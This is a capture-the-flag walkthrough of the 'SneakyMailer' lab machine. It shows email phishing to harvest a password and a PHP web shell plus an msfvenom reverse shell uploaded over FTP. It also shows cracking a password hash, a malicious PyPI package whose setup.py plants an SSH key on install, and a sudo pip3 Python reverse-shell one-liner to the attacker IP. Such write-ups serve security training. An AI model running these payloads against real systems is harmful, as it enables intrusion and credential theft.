---
icon: /assets/avatars/sneakymailer.png
image: /assets/avatars/sneakymailer.png
title: Sneakymailer Writeup
author: Valerio Casalino
---

# SneakyMailer

As always, `nmap`:

```bash
sudo nmap -sC -sV -oA nmap/initial 10.10.10.197
```

```
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 3.0.3
22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd (RSA)
|   256 d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 (ECDSA)
|_  256 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:fc:1a (ED25519)
25/tcp   open  smtp     Postfix smtpd
|_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING,
80/tcp   open  http     nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Did not follow redirect to http://sneakycorp.htb
143/tcp  open  imap     Courier Imapd (released 2018)
|_imap-capabilities: QUOTA UIDPLUS ACL CAPABILITY IDLE ENABLE SORT ACL2=UNION THREAD=REFERENCES CHILDREN STARTTLS OK UTF8=ACCEPTA0001 IMAP4rev1 THREAD=ORDEREDSUBJECT NAMESPACE completed
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Subject Alternative Name: email:postmaster@example.com
| Not valid before: 2020-05-14T17:14:21
|_Not valid after:  2021-05-14T17:14:21
|_ssl-date: TLS randomness does not represent time
993/tcp  open  ssl/imap Courier Imapd (released 2018)
|_imap-capabilities: QUOTA UIDPLUS ACL CAPABILITY IDLE ENABLE SORT ACL2=UNION THREAD=REFERENCES CHILDREN NAMESPACE OK THREAD=ORDEREDSUBJECT IMAP4rev1 UTF8=ACCEPTA0001 AUTH=PLAIN completed
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Subject Alternative Name: email:postmaster@example.com
| Not valid before: 2020-05-14T17:14:21
|_Not valid after:  2021-05-14T17:14:21
|_ssl-date: TLS randomness does not represent time
8080/tcp open  http     nginx 1.14.2
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: nginx/1.14.2
|_http-title: Welcome to nginx!
Service Info: Host:  debian; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Going to port 8080, we see the initial `nginx` page:

![image-20201025193649222](/assets/sneakymailer/image-20201025193649222.png)

 Going to port 80 we are redirected to `http://sneakycorp.htb`, so let's add the virtual host to the hosts file:

```bash
echo -e "\n\n#HTB\n10.10.10.197 sneakycorp.htb\n" | sudo tee -a /etc/hosts
```

Let's fuzz around until we see a bunch of mails (possible user names), and remembering the name of the box we better write those names down.

```
# mail.txt
airisatou@sneakymailer.htb
angelicaramos@sneakymailer.htb
ashtoncox@sneakymailer.htb
bradleygreer@sneakymailer.htb
brendenwagner@sneakymailer.htb
briellewilliamson@sneakymailer.htb
brunonash@sneakymailer.htb
caesarvance@sneakymailer.htb
carastevens@sneakymailer.htb
cedrickelly@sneakymailer.htb
chardemarshall@sneakymailer.htb
colleenhurst@sneakymailer.htb
dairios@sneakymailer.htb
donnasnider@sneakymailer.htb
doriswilder@sneakymailer.htb
finncamacho@sneakymailer.htb
fionagreen@sneakymailer.htb
garrettwinters@sneakymailer.htb
gavincortez@sneakymailer.htb
gavinjoyce@sneakymailer.htb
glorialittle@sneakymailer.htb
haleykennedy@sneakymailer.htb
hermionebutler@sneakymailer.htb
herrodchandler@sneakymailer.htb
hopefuentes@sneakymailer.htb
howardhatfield@sneakymailer.htb
jacksonbradshaw@sneakymailer.htb
jenagaines@sneakymailer.htb
jenettecaldwell@sneakymailer.htb
jenniferacosta@sneakymailer.htb
jenniferchang@sneakymailer.htb
jonasalexander@sneakymailer.htb
laelgreer@sneakymailer.htb
martenamccray@sneakymailer.htb
michaelsilva@sneakymailer.htb
michellehouse@sneakymailer.htb
olivialiang@sneakymailer.htb
paulbyrd@sneakymailer.htb
prescottbartlett@sneakymailer.htb
quinnflynn@sneakymailer.htb
rhonadavidson@sneakymailer.htb
sakurayamamoto@sneakymailer.htb
sergebaldwin@sneakymailer.htb
shaddecker@sneakymailer.htb
shouitou@sneakymailer.htb
sonyafrost@sneakymailer.htb
sukiburks@sneakymailer.htb
sulcud@sneakymailer.htb
tatyanafitzpatrick@sneakymailer.htb
thorwalton@sneakymailer.htb
tigernixon@sneakymailer.htb
timothymooney@sneakymailer.htb
unitybutler@sneakymailer.htb
vivianharrell@sneakymailer.htb
yuriberry@sneakymailer.htb
zenaidafrank@sneakymailer.htb
zoritaserrano@sneakymailer.htb
```

 Now, we should see if any of those mails answer. To do so, we're using `swaks` ([website](http://www.jetmore.org/john/code/swaks/)), that is a simple SMTP test tool. We start `nc` on another shell and run this code on `mails.txt`:

```bash
# First add sneakymailer.htb to /etc/hosts
for mail in $( cat ./mails.txt); do swaks -to "$mail" -from "lolz@sneakymailer.htb" -header "Subject: Lolz" -body "http://10.10.14.224:9001"; done
```

![image-20201025212831226](/assets/sneakymailer/image-20201025212831226.png)

I cheated because I already knew the correct email ;). But anyway something is returned. Pretty CTF for my tastes, but anyway, using [this site](https://www.url-encode-decode.com/):

```
# Url encoded
firstName=Paul&lastName=Byrd&email=paulbyrd%40sneakymailer.htb&password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt
# Url decoded
firstName=Paul&lastName=Byrd&email=paulbyrd@sneakymailer.htb&password=^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht&rpassword=^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht

```

After logging in with those credentials at `sneakymailer.htb` using IMAP and SMTP with login name "paulbyrd", you can see 2 messages:

![image-20201025222222047](/assets/sneakymailer/image-20201025222222047.png)


```
Hello low

Your current task is to install, test and then erase every python module you find in our PyPI service, let me know if you have any inconvenience.
```


![image-20201025222246182](/assets/sneakymailer/image-20201025222246182.png)

```
Hello administrator, I want to change this password for the developer account
 
Username: developer
Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C
 
Please notify me when you do it
```

Good hint, right? Let's see the `ftp` we left behind in the beginning:

```bash
ftp 10.10.10.197
...
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxr-x    8 0        1001         4096 Oct 25 11:59 dev
226 Directory send OK.
ftp> cd dev
250 Directory successfully changed.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 May 26 19:52 css
drwxr-xr-x    2 0        0            4096 May 26 19:52 img
-rwxr-xr-x    1 0        0           13742 Jun 23 09:44 index.php
drwxr-xr-x    3 0        0            4096 May 26 19:52 js
drwxr-xr-x    2 0        0            4096 May 26 19:52 pypi
drwxr-xr-x    4 0        0            4096 May 26 19:52 scss
-rwxr-xr-x    1 0        0           26523 May 26 20:58 team.php
drwxr-xr-x    8 0        0            4096 May 26 19:52 vendor
226 Directory send OK.
```

Seems that we have the website here. Since it runs PHP code, we should upload a webshell. I choose [this one](https://github.com/TheBinitGhimire/Web-Shells/blob/master/mini.php) for no particular reason. So, we:

```
PUT mini.php
```

But going to `http://sneakycorp.htb/mini.php` it's not found... That's because we should do a little step more and enumerate subdomains! To do this:

```bash
wfuzz -c -z file,/usr/share/wordlists/discovery/subdomains-top1million-5000.txt -H "Host: FUZZ.sneakycorp.htb" --hc 404,301 "http://sneakycorp.htb"
```

From the output, we find `dev` is resolved, which is curious, because it's the same name as the `ftp` folder, in fact, at `http://dev.sneakycorp.htb/mini.php` (after we add the domain to the hosts file) we are able to use the web shell... for like 10 seconds... So a reverse shell with PHP is preferrable. BTW I'm sorry for that mini shell, it is really awful and distracting. 

But, let's make our reverse shell, and what better way to generate that with `msfvenom`?

```bash
msfvenom -p php/reverse_php LHOST=10.10.14.224 LPORT=9001 > lolz.php
```

![image-20201025224941199](/assets/sneakymailer/image-20201025224941199.png)

Seems way more reliable, and we can also upgrade it if we want! [guide here](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/).

Or, better yet, use [this](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) reverse shell that daemonize the TCP connection, so that you won't be kicked out.

Looking around with `www-data` account, we can see other virtual hosts to add to the hosts file, including one with credentials in the `.htcpasswd` file!

![image-20201025225852635](/assets/sneakymailer/image-20201025225852635.png)

```
# Leaving the hash here for you :)
pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/
```

![image-20201025231501376](/assets/sneakymailer/image-20201025231501376.png)

So the hash is MD5, let's brute force it with john ;)

```bash
john --format=md5crypt --wordlist=/usr/share/wordlists/passwords/rockyou.txt hash.txt
```

![image-20201025231916959](/assets/sneakymailer/image-20201025231916959.png)

So, credentials are `pypi:soufianeelhaoui`. Pypi is not on port 80, but 8080. and If we connect:

![image-20201025232027120](/assets/sneakymailer/image-20201025232027120.png)

We get this page. And if we try to see /packages we are prompted to an http authentication that doesn't scare us because we have the creds! But there's no package there... Surely enough there will be a way to exploit this situation... Luckily, we have it, but it is a little f'd up.

So... we have to create a pseudo python package to upload to our local server and make it execute a payload, to do so we'll need 2 files:

```
# .pypirc
[distutils]
index-servers = local

[local]
repository: http://pypi.sneakycorp.htb:8080
username: pypi
password: soufianeelhaoui
```

 Containing our credentials and destination of our package. Then, we need (refer to [this example package](https://github.com/0x00-0x00/FakePip/blob/master/setup.py)):

```python
# setup.py
import setuptools

try:
    with open("/home/low/.ssh/authorized_keys", "a") as f:
        # Key generated with ssh-keygen -C "" -f ./key -t ed25519 just because it is shorter ;)
        f.write("\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA/UOG0a1dGeCtqLYA6zuCOq+pFqI8FRePH8hCJFEMLK")
        f.close()
except Exception as e:
    pass

setuptools.setup(
    name="lolz-package",
    version="90.0.0",
    author="Lolz",
    author_email="author@example.com",
    description="A small example package",
    long_description="",
    long_description_content_type="text/markdown",
    url="https://github.com/pypa/sampleproject",
    packages=setuptools.find_packages(),
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
)
```

This will trigger the execution of the code in the box, making it write our ssh-key in the authorized_keys of the user. To upload the package, you can refer to [this article](https://realpython.com/pypi-publish-python-package/) and [this article](https://medium.com/nagoya-foundation/uploading-your-own-python-package-to-pypi-python-package-index-6b78e1c9e6d1). After all, even if it is almost deprecated, this one liner works just fine:

```bash
HOME=$(pwd) # otherwise it will complain... a lot
python3 setup.py sdist register -r local upload -r local
```

Now, we can just ssh into the box as `low`. It was hard, but we got user!

![image-20201026003801120](/assets/sneakymailer/image-20201026003801120.png)

And would you look at the sweet `sudo -l` output?

![image-20201026004023399](/assets/sneakymailer/image-20201026004023399.png)

Basically we can install whatever package as super user. Why wouldn't we install [https://gtfobins.github.io/gtfobins/pip/#reverse-shell](https://github.com/0x00-0x00/FakePip/blob/master/setup.py)? We'll trigger a reverse shell as root with this `setup.py`. Follow the instructions (you can literally copy paste, but better without using environmental variables):

```bash
echo 'import sys,socket,os,pty;s=socket.socket();s.connect(("10.10.14.224",int(9001)));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")' > ./setup.py
sudo /usr/bin/pip3 install .
```

and you'll get root on the listening netcat!

![image-20201026012851703](/assets/sneakymailer/image-20201026012851703.png)

...profit.
